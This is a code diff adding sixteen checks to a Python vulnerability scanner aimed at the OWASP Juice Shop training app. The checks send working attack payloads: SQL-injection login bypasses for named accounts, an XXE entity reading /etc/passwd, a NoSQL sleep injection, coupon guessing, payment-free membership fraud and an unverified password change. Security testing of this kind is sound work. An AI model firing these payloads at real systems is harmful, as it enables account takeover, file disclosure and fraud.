@@ -161,6 +161,24 @@ class JuiceShopScanner(BaseScanner):
         self._test_register_admin_dupe(target)
         self._test_deprecated_interface(target)
 
+        # Phase 9: Additional Juice Shop challenges
+        self._test_coupon_manipulation(target)
+        self._test_repetitive_registration(target)
+        self._test_nosql_reviews(target)
+        self._test_login_bender(target)
+        self._test_login_jim(target)
+        self._test_password_strength(target)
+        self._test_csrf_change_password(target)
+        self._test_xxe_upload(target)
+        self._test_premium_paywall(target)
+        self._test_deluxe_fraud(target)
+        self._test_exposed_recycles(target)
+        self._test_exposed_complaints(target)
+        self._test_exposed_orders(target)
+        self._test_video_xss(target)
+        self._test_privacy_policy(target)
+        self._test_blockchain_address(target)
+
     # ── Injection checks ────────────────────────────────────────────
 
     def _test_sqli_login(self, target: str) -> bool:
@@ -1390,4 +1408,208 @@ class JuiceShopScanner(BaseScanner):
                         return True
         except Exception:
             pass
+        return False
+
+    # ── Phase 9 implementations ────────────────────────────────────
+
+    def _test_coupon_manipulation(self, target: str) -> bool:
+        try:
+            import datetime
+            now = datetime.datetime.now()
+            for discount in [10, 20, 30, 40, 50, 75, 80]:
+                code = f"{now.strftime('%b%y').upper()}-{discount}"
+                resp = self.http_client.put(
+                    f"{target}/rest/basket/1/coupon/{code}",
+                    headers=self._auth_headers(), timeout=5,
+                )
+                if resp.status_code == 200:
+                    self.add_finding(title=f"Predictable Coupon Code ({discount}% off)", severity=Severity.MEDIUM,
+                                     description="Coupon codes follow predictable MMMYY-DISCOUNT pattern.",
+                                     recommendation="Use cryptographically random coupon codes.",
+                                     evidence=f"PUT coupon/{code} accepted", url=f"{target}/rest/basket/1/coupon/{code}", cwe="CWE-330")
+                    return True
+        except Exception: pass
+        return False
+
+    def _test_repetitive_registration(self, target: str) -> bool:
+        try:
+            resp = None
+            for i in range(5):
+                resp = self.http_client.post(f"{target}/api/Users", json={"email": f"rl{i}@test.com", "password": "test1234", "passwordRepeat": "test1234",
+                    "securityQuestion": {"id": 1, "question": "t", "createdAt": "2024-01-01", "updatedAt": "2024-01-01"}, "securityAnswer": "t"},
+                    headers={"Content-Type": "application/json"}, timeout=5)
+            if resp and resp.status_code in (200, 201):
+                self.add_finding(title="No Rate Limiting on Registration", severity=Severity.MEDIUM,
+                                 description="5 consecutive registrations accepted.", recommendation="Add rate limiting.",
+                                 evidence="5 POST /api/Users all returned 200/201", url=f"{target}/api/Users", cwe="CWE-307")
+                return True
+        except Exception: pass
+        return False
+
+    def _test_nosql_reviews(self, target: str) -> bool:
+        try:
+            resp = self.http_client.get(f"{target}/rest/products/sleep(2000)/reviews", timeout=10)
+            if resp.status_code == 200:
+                self.add_finding(title="NoSQL Injection in Product Reviews", severity=Severity.HIGH,
+                                 description="Reviews endpoint accepts NoSQL operators.", recommendation="Validate product ID.",
+                                 evidence="GET /rest/products/sleep(2000)/reviews returned 200", url=f"{target}/rest/products/sleep(2000)/reviews", cwe="CWE-943")
+                return True
+        except Exception: pass
+        return False
+
+    def _test_login_bender(self, target: str) -> bool:
+        try:
+            resp = self.http_client.post(f"{target}/rest/user/login", json={"email": "bender@juice-sh.op'--", "password": "x"},
+                headers={"Content-Type": "application/json"}, timeout=10)
+            if resp.status_code == 200 and "token" in resp.text:
+                self.add_finding(title="SQLi Login Bypass - Bender Account", severity=Severity.CRITICAL,
+                                 description="Login as bender@juice-sh.op via SQLi.", recommendation="Use parameterized queries.",
+                                 evidence="bender@juice-sh.op'-- returned token", url=f"{target}/rest/user/login", cwe="CWE-89")
+                return True
+        except Exception: pass
+        return False
+
+    def _test_login_jim(self, target: str) -> bool:
+        try:
+            resp = self.http_client.post(f"{target}/rest/user/login", json={"email": "jim@juice-sh.op'--", "password": "x"},
+                headers={"Content-Type": "application/json"}, timeout=10)
+            if resp.status_code == 200 and "token" in resp.text:
+                self.add_finding(title="SQLi Login Bypass - Jim Account", severity=Severity.CRITICAL,
+                                 description="Login as jim@juice-sh.op via SQLi.", recommendation="Use parameterized queries.",
+                                 evidence="jim@juice-sh.op'-- returned token", url=f"{target}/rest/user/login", cwe="CWE-89")
+                return True
+        except Exception: pass
+        return False
+
+    def _test_password_strength(self, target: str) -> bool:
+        try:
+            resp = self.http_client.post(f"{target}/api/Users", json={"email": "weakpw@test.com", "password": "a", "passwordRepeat": "a",
+                "securityQuestion": {"id": 1, "question": "t", "createdAt": "2024-01-01", "updatedAt": "2024-01-01"}, "securityAnswer": "t"},
+                headers={"Content-Type": "application/json"}, timeout=5)
+            if resp.status_code in (200, 201):
+                self.add_finding(title="Weak Password Accepted (1 char)", severity=Severity.MEDIUM,
+                                 description="Registration accepts 1-char password.", recommendation="Enforce password complexity.",
+                                 evidence="password='a' accepted", url=f"{target}/api/Users", cwe="CWE-521")
+                return True
+        except Exception: pass
+        return False
+
+    def _test_csrf_change_password(self, target: str) -> bool:
+        if not self._auth_token: return False
+        try:
+            resp = self.http_client.get(f"{target}/rest/user/change-password?current=x&new=test1234&repeat=test1234",
+                headers=self._auth_headers(), timeout=5)
+            if resp.status_code == 200:
+                self.add_finding(title="Password Change Without Verification", severity=Severity.HIGH,
+                                 description="Password changed via GET without current password.", recommendation="Require current password + POST.",
+                                 evidence="GET change-password returned 200", url=f"{target}/rest/user/change-password", cwe="CWE-620")
+                return True
+        except Exception: pass
+        return False
+
+    def _test_xxe_upload(self, target: str) -> bool:
+        if not self._auth_token: return False
+        try:
+            xxe = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><order><productId>1</productId><quantity>&xxe;</quantity></order>'
+            resp = self.http_client.post(f"{target}/b2b/v2/orders", headers={"Content-Type": "application/xml", "Authorization": f"Bearer {self._auth_token}"},
+                data=xxe, timeout=10)
+            if resp.status_code in (200, 500) and ("root:" in resp.text or "ENTITY" in resp.text):
+                self.add_finding(title="XXE via B2B XML Interface", severity=Severity.CRITICAL,
+                                 description="B2B endpoint processes external entities.", recommendation="Disable DTD processing.",
+                                 evidence=f"XXE payload returned {resp.status_code}", url=f"{target}/b2b/v2/orders", cwe="CWE-611")
+                return True
+        except Exception: pass
+        return False
+
+    def _test_premium_paywall(self, target: str) -> bool:
+        try:
+            resp = self.http_client.get(f"{target}/this/page/is/hidden/behind/an/authentication/paywall", timeout=5)
+            if resp.status_code == 200 and len(resp.text) > 50:
+                self.add_finding(title="Premium Paywall Bypass", severity=Severity.MEDIUM,
+                                 description="Hidden premium content accessible.", recommendation="Server-side access control.",
+                                 evidence=f"Paywall page returned 200 ({len(resp.text)} bytes)",
+                                 url=f"{target}/this/page/is/hidden/behind/an/authentication/paywall", cwe="CWE-284")
+                return True
+        except Exception: pass
+        return False
+
+    def _test_deluxe_fraud(self, target: str) -> bool:
+        if not self._auth_token: return False
+        try:
+            resp = self.http_client.post(f"{target}/rest/deluxe-membership", json={"paymentMode": "none"},
+                headers=self._auth_headers(), timeout=5)
+            if resp.status_code == 200:
+                self.add_finding(title="Deluxe Membership Fraud", severity=Severity.HIGH,
+                                 description="Deluxe membership without valid payment.", recommendation="Validate payment.",
+                                 evidence="paymentMode=none accepted", url=f"{target}/rest/deluxe-membership", cwe="CWE-284")
+                return True
+        except Exception: pass
+        return False
+
+    def _test_exposed_recycles(self, target: str) -> bool:
+        try:
+            resp = self.http_client.get(f"{target}/api/Recycles", headers=self._auth_headers(), timeout=5)
+            if resp.status_code == 200 and ("data" in resp.text or "[" in resp.text):
+                self.add_finding(title="Recycling Data Accessible", severity=Severity.LOW,
+                                 description="Recycling records exposed.", recommendation="Restrict access.",
+                                 evidence="GET /api/Recycles returned 200", url=f"{target}/api/Recycles", cwe="CWE-200")
+                return True
+        except Exception: pass
+        return False
+
+    def _test_exposed_complaints(self, target: str) -> bool:
+        try:
+            resp = self.http_client.get(f"{target}/api/Complaints", headers=self._auth_headers(), timeout=5)
+            if resp.status_code == 200:
+                self.add_finding(title="Customer Complaints Accessible", severity=Severity.MEDIUM,
+                                 description="Complaints exposed via API.", recommendation="Restrict access.",
+                                 evidence="GET /api/Complaints returned 200", url=f"{target}/api/Complaints", cwe="CWE-200")
+                return True
+        except Exception: pass
+        return False
+
+    def _test_exposed_orders(self, target: str) -> bool:
+        try:
+            resp = self.http_client.get(f"{target}/rest/track-order/1", timeout=5)
+            if resp.status_code == 200 and len(resp.text) > 20:
+                self.add_finding(title="Order Tracking Without Auth", severity=Severity.MEDIUM,
+                                 description="Order tracking accessible without auth.", recommendation="Require auth.",
+                                 evidence="GET /rest/track-order/1 returned 200", url=f"{target}/rest/track-order/1", cwe="CWE-284")
+                return True
+        except Exception: pass
+        return False
+
+    def _test_video_xss(self, target: str) -> bool:
+        try:
+            resp = self.http_client.get(f"{target}/video", timeout=5)
+            if resp.status_code == 200:
+                self.add_finding(title="Video Endpoint Accessible", severity=Severity.LOW,
+                                 description="Video endpoint exists; subtitles may be injectable.", recommendation="Sanitize video metadata.",
+                                 evidence="GET /video returned 200", url=f"{target}/video", cwe="CWE-79")
+                return True
+        except Exception: pass
+        return False
+
+    def _test_privacy_policy(self, target: str) -> bool:
+        try:
+            resp = self.http_client.get(f"{target}/robots.txt", timeout=5)
+            if resp.status_code == 200 and "Disallow" in resp.text:
+                disallowed = [l.split(": ", 1)[1].strip() for l in resp.text.split("\n") if l.startswith("Disallow:") and ": " in l]
+                if disallowed:
+                    self.add_finding(title="Robots.txt Reveals Hidden Paths", severity=Severity.LOW,
+                                     description=f"Disallows: {', '.join(disallowed[:5])}", recommendation="Don't rely on robots.txt for security.",
+                                     evidence=f"Paths: {disallowed[:5]}", url=f"{target}/robots.txt", cwe="CWE-200")
+                    return True
+        except Exception: pass
+        return False
+
+    def _test_blockchain_address(self, target: str) -> bool:
+        try:
+            resp = self.http_client.get(f"{target}/api/Addresss", headers=self._auth_headers(), timeout=5)
+            if resp.status_code == 200 and ("data" in resp.text or "[" in resp.text):
+                self.add_finding(title="Address Data Accessible via API", severity=Severity.MEDIUM,
+                                 description="User addresses exposed.", recommendation="Restrict access.",
+                                 evidence="GET /api/Addresss returned 200", url=f"{target}/api/Addresss", cwe="CWE-200")
+                return True
+        except Exception: pass
         return False
